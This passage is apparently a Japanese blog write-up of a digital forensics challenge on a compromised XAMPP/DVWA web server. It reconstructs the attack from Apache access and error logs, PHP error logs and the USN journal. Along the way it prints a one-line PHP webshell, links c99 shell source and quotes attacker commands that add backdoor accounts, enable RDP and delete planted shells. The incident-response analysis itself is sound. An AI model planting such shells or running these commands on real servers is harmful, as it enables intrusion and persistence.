</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:59:38 -0700] &#34;GET /tmpbrjvl.php?cmd=del /F /Q C:\xampp\htdocs\tmpudvfh.php HTTP/1.1&#34; 200 11 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span><span style=display:flex><span>192.168.56.102 - - [02/Sep/2015:23:59:38 -0700] &#34;GET /tmpbrjvl.php?cmd=del /F /Q \xampp\htdocs\tmpbrjvl.php HTTP/1.1&#34; 200 11 &#34;-&#34; &#34;sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)&#34;
</span></span></code></pre></div><p>USNJrnlからも削除を確認することが出来る．UTCなので-7にする必要がある．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv|grep .php
</span></span><span style=display:flex><span>&#34;22433888&#34;      &#34;1&#34;     &#34;2015/09/03 06:59:38.713027&#34;    &#34;0.000000&#34;      &#34;tmpudvfh.php&#34;  &#34;DELETE|CLOSE&#34;  &#34;ARCHIVE&#34;       &#34;60478&#34; &#34;42732&#34; &#34;&#34;
</span></span><span style=display:flex><span>&#34;22433976&#34;      &#34;1&#34;     &#34;2015/09/03 06:59:38.822402&#34;    &#34;0.000000&#34;      &#34;tmpbrjvl.php&#34;  &#34;DELETE|CLOSE&#34;  &#34;ARCHIVE&#34;       &#34;62328&#34; &#34;42732&#34; &#34;&#34;
</span></span></code></pre></div><h3 id=localfileinclude>LocalFileInclude<a hidden class=anchor aria-hidden=true href=#localfileinclude>#</a></h3><p>ディレクトリトラバーサル攻撃とローカルファイルインクルード攻撃の区別が個人的についていなかったので，以下のブログを参考にさせていただきました．</p><p><a href=https://www.pupha.net/archives/1322/>ディレクトリ・トラバーサルとファイルインクルードとの違い - Web Application Security Memo</a></p><p>今回はLFIで良さそう．</p><p><code>/dvwa/vulnerabilities/fi</code>のディレクトリ名的にもFileIncludeを想定していそう．</p><p><img loading=lazy src=https://i.imgur.com/kA4XOOm.png></p><p>何回も行われているが，読み込まれているファイルとしては以下のものの様子．</p><ul><li>C:/Windows/System32/drivers/etc/hosts</li><li>DNSより参照されるIPアドレスとドメイン名の一覧などのファイル</li><li>C:/users/administrator/data.txt</li><li><img loading=lazy src=https://i.imgur.com/71MCrLI.png></li><li>作成日時や内容的に攻撃者が作成したテストファイルのように見える</li><li>C:/xampp/phpMyAdmin/config.inc</li><li>phpMyAdminの設定ファイルっぽいが，config.inc.phpはあるがこの名前のファイルは無いので，apacheのerror.logでFile not foundのエラーが返される</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>File not found - config.inc
</span></span><span style=display:flex><span>File not found - config.inc
</span></span><span style=display:flex><span>[Wed Sep 02 04:25:52.991836 2015] [authz_core:error] [pid 2880:tid 1564] [client 192.168.56.102:51858] AH01630: client denied by server configuration: C:/xampp/htdocs/xampp/htdocs
</span></span><span style=display:flex><span>[Wed Sep 02 23:52:24.494277 2015] [authz_core:error] [pid 2880:tid 1596] [client 192.168.56.102:51904] AH01630: client denied by server configuration: C:/xampp/htdocs/xampp/htdocs
</span></span></code></pre></div><ul><li><p>abc.txt</p><ul><li>?</li><li>USNJrnlを見ると<code>abc</code>というフォルダが作成されているが関係あるのかどうか</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv | grep abc
</span></span><span style=display:flex><span>&#34;22799776&#34;      &#34;2&#34;     &#34;2015/09/03 07:17:58.338027&#34;    &#34;0.000000&#34;      &#34;abc\&#34;  &#34;CREATE|CLOSE&#34;  &#34;FOLDER&#34;        &#34;62335&#34; &#34;60268&#34; &#34;&#34;
</span></span></code></pre></div><h4 id=phpのログを見る>PHPのログを見る<a hidden class=anchor aria-hidden=true href=#phpのログを見る>#</a></h4><p><code>/xampp/php/php.ini</code>で設定ファイルを確認．</p><p>エラーログはここあるらしい．<code>error_log="C:\xampp\php\logs\php_error_log"</code></p><p>ログ中に<code>Europe/Berlin</code>とあり，timezoneが違うようなので，おそらくUTC+1したものとなる．</p><p>include()する際，開くことが出来なかったファイルパスを確認することが出来る．
<img loading=lazy src=https://i.imgur.com/oYyNWrT.png></p><h3 id=webshell>WebShell<a hidden class=anchor aria-hidden=true href=#webshell>#</a></h3><p>USNJrnlを見ているとWebShellっぽいものが作成されていることを確認することが出来る．
webshells.zipの中身は<code>c99.php</code>，<code>webshell.php</code>の様子．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/usnjrnl]$ cat usn_analytics_records-20150903T065251.csv|grep webshells
</span></span><span style=display:flex><span>&#34;22709744&#34;      &#34;5&#34;     &#34;2015/09/03 07:14:48.103652&#34;    &#34;0.031250&#34;      &#34;webshells.zip&#34; &#34;CREATE|EXTEND|OVERWRITE|INFO|CLOSE&#34;    &#34;ARCHIVE&#34;       &#34;62331&#34; &#34;12859&#34; &#34;&#34;
</span></span><span style=display:flex><span>&#34;22710184&#34;      &#34;2&#34;     &#34;2015/09/03 07:14:51.338027&#34;    &#34;0.000000&#34;      &#34;webshells\&#34;    &#34;CREATE|CLOSE&#34;  &#34;FOLDER&#34;        &#34;62332&#34; &#34;12859&#34; &#34;&#34;
</span></span><span style=display:flex><span>&#34;22710344&#34;      &#34;5&#34;     &#34;2015/09/03 07:14:51.384902&#34;    &#34;0.000000&#34;      &#34;c99.php&#34;       &#34;CREATE|EXTEND|INFO|CLOSE&#34;      &#34;ARCHIVE&#34;       &#34;62333&#34; &#34;62332&#34; &#34;webshells\&#34;
</span></span><span style=display:flex><span>&#34;22710744&#34;      &#34;5&#34;     &#34;2015/09/03 07:14:51.463027&#34;    &#34;0.015625&#34;      &#34;webshell.php&#34;  &#34;CREATE|EXTEND|INFO|CLOSE&#34;      &#34;ARCHIVE&#34;       &#34;62334&#34; &#34;62332&#34; &#34;webshells\&#34;
</span></span><span style=display:flex><span>&#34;22711184&#34;      &#34;3&#34;     &#34;2015/09/03 07:14:57.400527&#34;    &#34;0.000000&#34;      &#34;c99.php (62332 -&gt; 12859)&#34;      &#34;MOVE&#34;  &#34;ARCHIVE&#34;       &#34;62333&#34; &#34;62332&#34; &#34;webshells\&#34;
</span></span><span style=display:flex><span>&#34;22711424&#34;      &#34;3&#34;     &#34;2015/09/03 07:14:57.400527&#34;    &#34;0.000000&#34;      &#34;webshell.php (62332 -&gt; 12859)&#34; &#34;MOVE&#34;  &#34;ARCHIVE&#34;       &#34;62334&#34; &#34;62332&#34; &#34;webshells\&#34;
</span></span></code></pre></div><p>webshell.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>($_GET[<span style=color:#e6db74>&#34;cmd&#34;</span>]);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>c99.php</p><p><a href=https://github.com/tennc/webshell/blob/master/php/PHPshell/c99/c99.php>https://github.com/tennc/webshell/blob/master/php/PHPshell/c99/c99.php</a></p><p><code>SHA-256 4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c</code></p><p>VirusTotalにハッシュをぶち込むと有名なc99.phpと出してくれる．
<a href=https://www.virustotal.com/#/file/4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c/detection>https://www.virustotal.com/#/file/4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c/detection</a></p><p><img loading=lazy src=https://i.imgur.com/N5rnqxr.png></p><p><code>c99.php</code>を実行した際のエラーがphp_error_logに残っているのでこの時間には実行されたというのが確認出来る．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01]$ cat php_error_log | grep c99.php
</span></span><span style=display:flex><span>[03-Sep-2015 09:19:32 Europe/Berlin] PHP Parse error:  syntax error, unexpected &#39;}&#39; in C:\xampp\htdocs\DVWA\c99.php on line 2565
</span></span></code></pre></div><p>他にも，/xampp/htdocs/DVWA/hackable/uploads下に<code>phpshell.php</code>，<code>php2shell.php</code>が設置されている．
<img loading=lazy src=https://i.imgur.com/87dgVpF.png></p><p>access.logを見ると，<code>abc</code>ディレクトリを作成するコマンドを受け付けていたのは<code>phpshell.php</code>だということが判明．
<img loading=lazy src=https://i.imgur.com/TVbbm6X.png></p><p>php_error_logにも<code>phpshell.php</code>の痕跡が残っている．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01]$ cat php_error_log | grep phpshell.php
</span></span><span style=display:flex><span>[03-Sep-2015 09:15:58 Europe/Berlin] PHP Notice:  Undefined index: cmd in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
</span></span><span style=display:flex><span>[03-Sep-2015 09:15:58 Europe/Berlin] PHP Warning:  system(): Cannot execute a blank command in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
</span></span><span style=display:flex><span>[03-Sep-2015 09:16:03 Europe/Berlin] PHP Notice:  Undefined index: cmd in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
</span></span><span style=display:flex><span>[03-Sep-2015 09:16:03 Europe/Berlin] PHP Warning:  system(): Cannot execute a blank command in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
</span></span><span style=display:flex><span>[03-Sep-2015 09:18:58 Europe/Berlin] PHP Notice:  Undefined index: cmd in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
</span></span><span style=display:flex><span>[03-Sep-2015 09:18:58 Europe/Berlin] PHP Warning:  system(): Cannot execute a blank command in C:\xampp\htdocs\DVWA\hackable\uploads\phpshell.php on line 2
</span></span></code></pre></div><h3 id=timeline>TimeLine<a hidden class=anchor aria-hidden=true href=#timeline>#</a></h3><p>正直，UTCとかがごちゃごちゃで間違っている気さえする．</p><p>Web Server Caseということもあり，apache logをかなり見てしまった．良いのか．</p><table><thead><tr><th>日時(UTC)</th><th>事象</th><th>ソース 　</th><th>備考 　</th></tr></thead><tbody><tr><td>2015/09/02 08:52:29</td><td>/dvwa/vulnerabilities/exec/へのHTTP通信開始</td><td>apache access.log</td><td>UAと時間的にこのくらいの時間</td></tr><tr><td>2015/09/02 ??:??:??</td><td>コマンド実行net user user1 user1 /add(user1作成)</td><td>メモリダンプ(console)　</td><td>/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?</td></tr><tr><td>2015/09/02 09:05:06</td><td>user1アカウントの作成</td><td>　SAM 　</td><td></td></tr><tr><td>2015/09/02 ??:??:??</td><td>コマンド実行net localgroup &ldquo;Remote Desktop Users&rdquo; user1 /add(user1のRDPローカルグループの追加)</td><td>メモリダンプ(console)　</td><td>/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?</td></tr><tr><td>2015/09/02 ??:??:??</td><td>コマンド実行netsh firewall set service type = remotedesktop enable(RDPの有効)</td><td>メモリダンプ(console)　</td><td>/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?</td></tr><tr><td>2015/09/02 09:05:??</td><td>コマンド実行net user hacker hacker /add(hacker作成)</td><td>メモリダンプ(strings)　</td><td>/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?</td></tr><tr><td>2015/09/02 09:05:25</td><td>hackerアカウントの作成</td><td>SAM 　</td><td></td></tr><tr><td>2015/09/02 09:05:??</td><td>コマンド実行net localgroup &ldquo;Remote Desktop Users&rdquo; hacker /add(hacker作成)</td><td>メモリダンプ(strings)　</td><td>/dvwa/vulnerabilities/exec/でのOSコマンドインジェクション?</td></tr><tr><td>2015/09/02 09:31:16</td><td>/windows/system32/drivers/etc/hostsの読み込み</td><td>apache access.log　</td><td>LFI</td></tr><tr><td>2015/09/02 09:33:23</td><td>/users/administrator/data.txtの読み込み</td><td>apache access.log　</td><td>LFI</td></tr><tr><td>2015/09/02 09:34:52</td><td>/xampp/phpmyadmin/config.incの読み込み</td><td>apache access.log, error.log　</td><td>LFI config.incはないconfig.inc.phpは現存する</td></tr><tr><td>2015/09/02 11:15:40</td><td>sqlmapでの攻撃開始</td><td>apache access.log</td><td></td></tr><tr><td>2015/09/02 11:25:52</td><td>/xampp/htdocs/tmpukudk.phpの作成</td><td>apache access.log</td><td>SQLinjection</td></tr><tr><td>2015/09/02 11:26:04</td><td>tmpbiwuc.phpの作成</td><td>apache_access.log</td><td>Python-urllib経由の様子</td></tr><tr><td>2015/09/02 11:26:04</td><td>tmpbiwuc.phpでコマンド実行dir</td><td>apache access.log</td><td></td></tr><tr><td>2015/09/02 11:26:04</td><td>tmpbiwuc.phpでコマンド実行del /F /Q C:\xampp\htdocs mpukudk.php(tmpukudk.phpの削除)</td><td>apache access.log</td><td></td></tr><tr><td>2015/09/02 11:26:23</td><td>tmpbiwuc.phpでコマンド実行del /F /Q \xampp\htdocs\tmpbiwuc.php(tmpbiwuc.phpの削除)</td><td>apache access.log</td><td></td></tr><tr><td>2015/09/03 06:52:24</td><td>/xampp/htdocs/tmpudvfh.phpの作成</td><td>apache_access.log</td><td>SQLinjection</td></tr><tr><td>2015/09/03 06:52:2?</td><td>tmpbrjvl.phpの作成</td><td>apache_access.log</td><td>Python-urllib経由の様子</td></tr><tr><td>2015/09/03 06:52:24</td><td>tmpbrjvl.phpでコマンド実行echo command execution test(テストコマンド)</td><td>apache_access.log</td><td></td></tr><tr><td>2015/09/03 06:59:38</td><td>tmpbrjvl.phpでコマンド実行cmd=del /F /Q C:\xampp\htdocs\tmpudvfh.php(tmpudvfh.php削除)</td><td>apache_access.log, UsnJrnl</td><td></td></tr><tr><td>2015/09/03 06:59:38</td><td>tmpbrjvl.phpでコマンド実行cmd=del /F /Q C:\xampp\htdocs\tmpbrjvl.php(tmpbrjvl.php削除)</td><td>apache_access.log, UsnJrnl</td><td></td></tr><tr><td>2015/09/03 07:14:48</td><td>webshells.zipの作成</td><td>UsnJrnl</td><td></td></tr><tr><td>2015/09/03 07:16:13</td><td>phpshell.phpでコマンド実行dir</td><td>apache access.log</td><td></td></tr><tr><td>2015/09/03 07:17:49</td><td>phpshell.phpでコマンド実行dir c:\</td><td>apache access.log</td><td></td></tr><tr><td>2015/09/03 07:17:58</td><td>phpshell.phpでコマンド実行mkdir abc</td><td>apache access.log</td><td>これいる？</td></tr><tr><td>2015/09/03 07:18:02</td><td>phpshell.phpでコマンド実行dir</td><td>apache access.log</td><td></td></tr><tr><td>2015/09/03 07:21:37</td><td>c99でcmd実行</td><td>apache access.log</td><td>c99.php?act=cmdのリクエストが発生</td></tr></tbody></table></div><footer class=post-footer><ul class=post-tags><li><a href=https://socketo.github.io/tags/forensics/>Forensics</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Digital Forensic Challenge #1 - Web Server Case Write up on x" href="https://x.com/intent/tweet/?text=Digital%20Forensic%20Challenge%20%231%20-%20Web%20Server%20Case%20Write%20up&amp;url=https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f&amp;hashtags=Forensics"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Digital Forensic Challenge #1 - Web Server Case Write up on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f&amp;title=Digital%20Forensic%20Challenge%20%231%20-%20Web%20Server%20Case%20Write%20up&amp;summary=Digital%20Forensic%20Challenge%20%231%20-%20Web%20Server%20Case%20Write%20up&amp;source=https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Digital Forensic Challenge #1 - Web Server Case Write up on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f&title=Digital%20Forensic%20Challenge%20%231%20-%20Web%20Server%20Case%20Write%20up"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Digital Forensic Challenge #1 - Web Server Case Write up on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Digital Forensic Challenge #1 - Web Server Case Write up on whatsapp" href="https://api.whatsapp.com/send?text=Digital%20Forensic%20Challenge%20%231%20-%20Web%20Server%20Case%20Write%20up%20-%20https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Digital Forensic Challenge #1 - Web Server Case Write up on telegram" href="https://telegram.me/share/url?text=Digital%20Forensic%20Challenge%20%231%20-%20Web%20Server%20Case%20Write%20up&amp;url=https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Digital Forensic Challenge #1 - Web Server Case Write up on ycombinator" href="https://news.ycombinator.com/submitlink?t=Digital%20Forensic%20Challenge%20%231%20-%20Web%20Server%20Case%20Write%20up&u=https%3a%2f%2fsocketo.github.io%2fposts%2f2018%2f02%2f05%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://socketo.github.io/>socketo.github.io</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>